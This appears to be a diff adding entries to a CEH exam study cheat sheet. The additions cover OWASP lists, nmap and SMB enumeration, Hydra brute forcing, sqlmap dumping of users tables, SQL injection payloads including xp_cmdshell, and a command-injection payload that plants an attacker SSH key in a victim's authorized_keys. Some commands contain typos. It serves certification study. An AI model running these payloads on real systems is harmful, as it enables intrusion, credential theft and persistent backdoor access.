@@ -51,6 +51,34 @@ Social Engineering
 Cloud Penetration Testing
 Agile Penetration Testing
 
+
+OWASP Top 10 CEHv12
+Top 10:2021 List
+A01 Broken Access Control
+A02 Cryptographic Failures
+A03 Injection
+A04 Insecure Design
+A05 Security Misconfiguration
+A06 Vulnerable and Outdated Components
+A07 Identification and Authentication Failures
+A08 Software and Data Integrity Failures
+A09 Security Logging and Monitoring Failures
+A10 Server Side Request Forgery (SSRF)
+
+OWASP Top 10 CEHv11
+2017 Top 10
+A1:2017-Injection
+A2:2017-Broken Authentication
+A3:2017-Sensitive Data Exposure
+A4:2017-XML External Entities (XXE)
+A5:2017-Broken Access Control
+A6:2017-Security Misconfiguration
+A7:2017-Cross-Site Scripting (XSS)
+A8:2017-Insecure Deserialization
+A9:2017-Using Components with Known Vulnerabilities
+A10:2017-Insufficient Logging & Monitoring
+
+
 Legal
 18 U.S.C 1029 & 1030	
 RFC 1918 – Private IP Standard	SOX – Corporate Finance Processes
@@ -420,6 +448,19 @@ NMAP <SCAN OPTIONS> <TARGET>
 -PT: TCP ping -oN: Normal output
 -oX: XML output -A OS/Vers/Script
 -T<0-5>: Slow – Fast ( 0 least detective)
+Nmap  -A 10.10.10.10  (aggressive scan- Traceroute, T4, OS)
+nmap  -sC  (service scan)
+nmap -sV  (version scan)
+nmap  -sP 10.10.10.10/24  (how many hosts are up in the whole network)/ping scan
+nmap  -sL  (hostnames)
+nmap  -oN <filename>  (to save output in a file)
+nmap  -F  (fast scan)
+nmap  -O  (os scan)
+
+nmap smb scripts:
+nmap --script smb-os-discovery.nse -p445 <ip>  (enumerate os, domain name,etc)
+nmap --script smb-enum-users.nse -p445 <ip>  (used to enumerate all users on remote Windows system using SAMR enumeration and LSA bruteforcing)
+nmap -p 445 --script=smb-enum-shares.nse, smb-enum-users.nse 10.10.19.21 (smb users and shares)
 
 NMAP SCAN TYPES
 
@@ -585,6 +626,13 @@ The following do not check size of destination buffers: gets() strcpy() stract()
 
 
 Wireless  Network Hacking
+
+GSM
+Global System for Mobile Communication
+Generations: 2G (GSM), 3G (UMTS), 4G (LTE)
+Frequency: 900 MHz - 1800 MHz
+
+
 WIRELESS SNIFFING
 Compatible wireless adapter with promiscuous mode is required, but otherwise pretty much the same as sniffing wired.
 802.11 SPECIFICATIONS			
@@ -597,9 +645,9 @@ Spec	Dist	Speed	Freq
 802.11b	100m	11 Mbps	2.4 GHz
 802.11g	100m	54 Mbps	2.4 GHz
 802.11n	125m	100 Mbps+	2.4/5GHz
+802.11ac	5 Ghz	MIMO-OFDM
 
-
-BLUETOOTH ATTACKS
+BLUETOOTH ATTACKS 2.4 Ghz	
 Bluesmacking: DoS against a device
 Bluejacking: Sending messages to/from devices
 Bluesniffing: Sniffs for Bluetooth
@@ -608,6 +656,9 @@ Bluesnarfing: actual theft of data from a device
 Password protection in apps:
 
 Use Password salting
+
+Password salting is the process of adding additional character in the password to one-way function. This makes the password more difficult to reverse the hash. The function of salting is to defeat the Dictionary Attacks and Rainbow Table attacks.
+
 
 
 Trojans and Other Attacks
@@ -632,7 +683,7 @@ Smurf:	Send large number of pings to the broadcast address of the subnet with so
 Fraggle Attack:	Similar to Smurf but uses UDP.
 Ping of Death:	Attacker fragments ICMP message to send to target. When the fragments are reassembled, the resultant ICMP packet is larger than max size and crashes the system
 
-inux Commands
+Linux:
 LINUX FILE SYSTEM	
 /	-Root
 /var	-Variable Data / Log Files
@@ -708,6 +759,10 @@ Aircrack
 Rainbow Crack
 Brutus
 KerbCrack
+pwdump7
+fgdump
+Pyrit
+
 
 Sniffing
 Wireshark
@@ -809,6 +864,7 @@ SQL Injection Brute
 SQL Brute
 SQLNinja
 SQLGET
+sqlmap
 
 
 SCANNING AND ENUMERATION
@@ -1056,6 +1112,13 @@ For group names:
 · 1E: Browser Service Elections
 
 
+MITM Attacks:
+
+SSL Strip
+Burp Suite
+Browser Exploitation Framework (BeEF)
+
+
 Network Hacking:
 
 Promiscuous mode -  allows you to intercept and read each network packet that arrives in its entirety
@@ -1079,12 +1142,107 @@ According EC-Council's courseware:
 
 - Use NTLM or any basic authentication mechanism to limit access to legitimate users.
 
+NTLM Authentication
+NT Lan Manager is a proprietary authentication protocol by Microsoft. In the authentication process, user sends login credentials to a domain controller in hashed format. Domain controller responds to a challenge known as nonce to be encrypted by the password's hash. This challenge is a 16 byte random number generated ny the domain controller. By comparing the challenge with the database, domain controller permit or deny the login. Microsoft upgraded its default authentication mechanism from NTLM to Kerberos.
+
+NTLM has two version:
+
+NTLMv1 (Older)
+NTLMv2 (Improved)
+For additional security layer, NTLM is combined with Security Support Provider.
 
 
-Linux OS:
+
+Linux APPS :
+
+smbclient //10.10.19.21/anonymous  (accessing smb shares)
+smbget -R smb://10.10.19.21/anonymous   (downloading smb files)
+ enum4linux
+enum4linux -u martin -p apple -U 10.10.10.12 | - u user -p pass -U get user list
+enum4linux -u martin -p apple -o 10.10.10.12 | -o get OS info
+enum4linux -u martin -p apple -P 10.10.10.12 | -P get password policy info
+enum4linux -u martin -p apple -G 10.10.10.12 | -G get groups and members info
+enum4linux -u martin -p apple -S 10.10.10.12 | -S get share list info
+enum4linux -u martin -p apple -a 10.10.10.12 | -a get all simple enumeration data [-U -S -G -P -r -o -n -i]
+ Wpscan
+wpscan --url http://[IP Address]:8080/CEH --enumerate u  (enumerate the usernames stored in the website’s database)
+Vulnerability analysis
+nikto  -h  http://testphp.vulnweb.com/login.php -Tuning 1
+Bruteforce-
+Hydra  -L username  -P /usr/share/wordlists/rockyou.txt ftp://xiotz.com
+Cryptography-
+Hashcalc
+Md5 calculator
+Cryptool – decode .hex file
+Bctextencoder – decrypt text using secret key
+Veracrypt – anything related to volume
+Crack hashes- hashes.com, cyberchef 
+Steganography-
+ Steghide  embed  -ef  <filename>  -cf  <image>  -p  <passphrase>
+ Steghide  extract  -sf  <image>       (extract hidden data from image)
+ Stegcracker  <image>  /usr/share/wordlists/rockyou.txt         (crack the passphrase of image)
+  https://futureboy.us/stegano/decinput.html (online steganography tool)
+ sha256sum <filename>   (find hash of the file)
+ 
+Tools to know for practival:
+  
+Nmap +
+Hydra
+Sqlmap 
+Wpscan
+Nikto
+John
+Hashcat
+Metasploit
+Responder LLMNR
+Wireshark / tcpdump
+Steghide
+OpenStack
+QuickStego
+Dirb
+Searchsploit
+Crunch
+Cell
+Veracrypt
+Hashcalc
+Rainbow Crack
+netcat+
+
+Password Cracking Countermeasures
+Change default password
+Do not store/save passwords in applications
+Do not use guessable passwords
+Set strong password
+Password encryption
+Keep credentials secure and secret
+Enable SYSKEY
+Password salting
+Advance security audits
+Periodically update passwords
+Monitor attacks
+Different password for each service
+Configure policies for incorrect password attempts
+
+ 
+ How many machines are active in a network - net discover -i 192.168.1.0/24
+Connect to RDP via cmd - mstsc 
+Find DNS records - https://www.nslookup.io/
+Scan the whole website- (skipfish -o /root/test -S /usr/share/skipfish/dictionaries/complete.wl http://10.10.10.10:8080)
+-o output
+-S wordlist 
+To brute force directories or files-
+robuster dir  -u 10.10.10.10  -w /usr/share/dirb/wordlists/common.txt  -x  .txt
+ OR
+uniscan -u http://10.10.10.12:8080/CEH -q   (for directories)
+uniscan –u http://10.10.10.12:8080/CEH -we (enable file check like robots.txt and sitemap.xml)
+To get the file from the server- get http://10.10.10.10/secret.txt 
+FTP Login - ftp <ip>
+get <file name>   (to get file from FTP login)
+SSH Login - SSH username@10.10.10.10
 
 
-Android Iphone:
+
+Android Iphone Hacking:
 
 Types of jailbreaking tools
 
@@ -1112,6 +1270,22 @@ This type of jailbreak allows a user to reboot their phone normally, but upon do
 
 This type of jailbreak is like a semi-tethered jailbreak in which when the device reboots, it no longer has a patched kernel, but the key difference is that the kernel can be patched without using a computer. The kernel is usually patched using an application installed on the device without patches. This type of jailbreak has become increasingly popular, with most recent jailbreaks classified as semi-untethered.
 
+via USB
+./adb tcpip 5555
+./adb connect 192.168.43.117:5555
+./adb devices
+./adb  -d shell (Direct an adb command to the only attached USB device)
+ls
+cd sdcard
+ls
+cd dcim
+cd camera
+ls
+./adb   push                C:\platform-tools\ota.zip /sdcard/Download           (from pc to android)
+ <            pc location   >                  <android location>
+ 
+./adb   pull     /sdcard/Download/magisk_patched.img       C:\platform-tools            (from android to pc)
+ <            android location   >                      <pc location>
 
 
 WiFi LTE RADIO Hacking:
@@ -1169,22 +1343,71 @@ IPsec suite:
 
 SQL hacking and examples
 
+
+ Boolean-Based Blind SQL Injection:
+' OR '1'='1' --
+Explanation:
+This payload is injected into a SQL query where it evaluates to TRUE for every row. The double dash (--) is used to comment out the rest of the query.
+
+Error-Based Blind SQL Injection
+' OR 1=CONVERT(int, (SELECT @@version)) --
+Explanation:
+This payload attempts to trigger an error by converting the result of SELECT @@version to an integer. If successful, it might reveal information about the database version.
+
+
 Out-of-band SQLi - leverages a database server’s ability to make DNS requests to pass data to an attacker 
+'; EXEC xp_cmdshell('nslookup example.com') --
 
 In-band SQL injection is the most common and easy-to-exploit of SQL injection attacks. In-band SQL injection occurs when an attacker is able to use the same communication channel to both launch the attack and gather results.
 
 - Union-based SQLi
+' UNION SELECT NULL, username, password FROM users --
+
+SELECT password FROM table1
+UNION
+SELECT password FROM table2
+
 
 Union-based SQLi is an in-band SQL injection technique that leverages the UNION SQL operator to combine the results of two or more SELECT statements into a single result which is then returned as part of the HTTP response.
 
 - Time-based blind SQLi
+' OR IF(1=1, SLEEP(5), 0) --
 
 Time-based SQL injection is an inferential SQL injection technique that relies on sending an SQL query to the database which forces the database to wait for a specified amount of time (in seconds) before responding. The response time will indicate to the attacker whether the result of the query is TRUE or FALSE.
 
+sqlmap-
+site:http://testphp.vulnweb.com/ php?= (for finding vulnerable site)
+(for cookies- console->document.cookie)
+ 
+sqlmap -u http://testphp.vulnweb.com/artists.php?artist=1 --dbs   (databases)
+sqlmap -u http://testphp.vulnweb.com/artists.php?artist=1 -D acuart –tables   (tables)
+sqlmap -u http://testphp.vulnweb.com/artists.php?artist=1 -D acuart -T users --columns   (columns)
+(dump whole table)
+sqlmap -u http://testphp.vulnweb.com/artists.php?artist=1 -D acuart -T users  --dump 
+ OR 
+(dump individual  column data)
+sqlmap -u http://testphp.vulnweb.com/artists.php?artist=1 -D acuart -T users -C uname  --dump 
+sqlmap -u http://testphp.vulnweb.com/artists.php?artist=1 -D acuart -T users -C pass  --dump
+ 
+
+command injection
+
+just use ; and type your command
+; cd ~ && pwd
 
 Web applicaiton hacking:
 
+Generate SSH Key Pair:
+cd ~/.ssh/id_rsa
+ssh-keygen -t rsa -b 2048 -C "your_email@example.com"
+cat ~/.ssh/id_rsa.pub
+echo "your_public_key_content" > /path/to/target/app/authorized_keys
 
+
+
+inject your SSH key to victim device(FYI - SSL key has been modified):
+
+; echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCW+gcpi9WfUm1gwtYghmIwnLf1rkca1ZRdgfgdfjjkjkEFDeXXh1eV0prP1cOsUmAmfJl/GBwiGyRo79gkmHE5p0gyH3SlSfIXkI/PDz/E9PNIu/lDBLWNjT8ELJF2GgDU2GiuNh5ryK9zlTiEmvpI5/Nre/K1yliqsCzr5SLWRREQ2uQv8fb6z47YnTOVb09DlOr8HIiXTnQznNaQGeuKkud9K/c9kFojFK9aJgi60XHNUcgbQv9AZZhG2pzFt4cgo/hHv17Zv762Sc33kd+33boIXmKk4+iFYKAH6BkL1kIDnCCV3CB32yKEufcoUBeTDgPu9XkbeHb3VHN8BzuSXXjYHI+vrrj+qj6CsH8atiiTQBG8pGnZYhh2AWvR7pGF3Lydp0k0fcYlVyKuCxZU6RNs7jITJKwG2Uju9sfDHG4GXL8+HkRYQjS+v2Nx1seyR0dyTqAf0BOwEoSlfWLcgzdu/GhrKedyKM9gx/xcU= uggy@kali" > ./authorized_keys
 
 
 Script samples:
